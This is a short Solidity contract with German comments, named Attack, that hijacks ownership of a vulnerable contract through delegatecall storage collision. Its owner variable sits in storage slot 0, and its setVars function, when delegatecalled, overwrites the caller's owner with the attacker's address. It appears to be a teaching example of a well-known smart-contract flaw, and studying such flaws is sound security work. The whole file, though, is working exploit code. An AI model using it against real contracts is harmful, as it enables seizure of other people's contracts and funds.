// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title Malicious logic contract used to hijack owner via delegatecall
/// @notice Speicher-Layout der ersten Variable (owner) trifft Slot 0 im Aufrufer
contract Attack {
    // Layout spiegelt bewusst 'owner' in Slot 0 wider
    address public owner;

    // Signatur passt zur erwarteten Funktion im Vulnerable.setVars(...)
    function setVars(uint256 /*_num*/) public payable {
        // ⚠️ Wegen delegatecall wird hier der Storage des Vulnerable überschrieben
        owner = msg.sender; // macht den Aufrufer (Angreifer) zum Owner des Vulnerable
    }
}
